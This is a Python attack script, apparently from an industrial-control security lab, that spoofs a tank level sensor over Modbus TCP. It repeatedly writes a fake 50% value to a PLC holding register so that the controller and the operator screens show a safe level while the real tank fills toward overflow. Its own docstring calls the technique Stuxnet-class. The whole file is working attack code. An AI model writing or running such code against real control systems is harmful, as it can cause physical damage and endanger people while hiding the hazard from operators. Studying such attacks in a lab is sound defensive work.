#!/usr/bin/env python3
"""sensor_spoof.py — false data injection on the tank level register.

The simulator writes the true tank level to holding register 1024 (%MW0)
about ten times a second. This script writes a fake 500 (= 50.0 %) to the
same register as fast as it can. The PLC's control logic and the HMI then
see a steady, safe-looking mid-tank level while the real tank keeps filling.

Because the spoofed level stays in the 30-70 % deadband, the pump never
starts, so the real tank rises toward overflow while every screen shows 50 %.
This is the Stuxnet-class trick: lie to the controller about the process.

DESTRUCTIVE to process integrity. Lab use only.
"""

from __future__ import annotations

import time

from pymodbus.client import ModbusTcpClient

from lab_target import LEVEL_REG, MODBUS_UNIT, PLC_PORT, log, resolve_plc

FAKE_RAW = 500        # 50.0 %
DURATION = 20
INTERVAL = 0.1        # ~10 writes/s, matching the simulator's cadence


def main() -> None:
    ip = resolve_plc()
    c = ModbusTcpClient(ip, port=PLC_PORT, timeout=2)
    if not c.connect():
        raise SystemExit(f"cannot connect to PLC {ip}:{PLC_PORT}")

    log(f"sensor_spoof start — pinning level reg {LEVEL_REG} to {FAKE_RAW} "
        f"(50.0%) on {ip} for {DURATION}s")
    writes = 0
    try:
        end = time.time() + DURATION
        while time.time() < end:
            wr = c.write_register(LEVEL_REG, FAKE_RAW, device_id=MODBUS_UNIT)
            writes += 1
            status = "err" if wr.isError() else "ok"
            rc = c.read_holding_registers(LEVEL_REG, count=1, device_id=MODBUS_UNIT)
            seen = None if rc.isError() else rc.registers[0]
            shown = f"{seen / 10:.1f}%" if seen is not None else "?"
            log(f"  wrote level={FAKE_RAW} (50.0%) [{status}]; "
                f"reg now reads {seen} ({shown})")
            time.sleep(INTERVAL)
    finally:
        c.close()
    log(f"sensor_spoof done — {writes} spoofed writes injected")


if __name__ == "__main__":
    main()
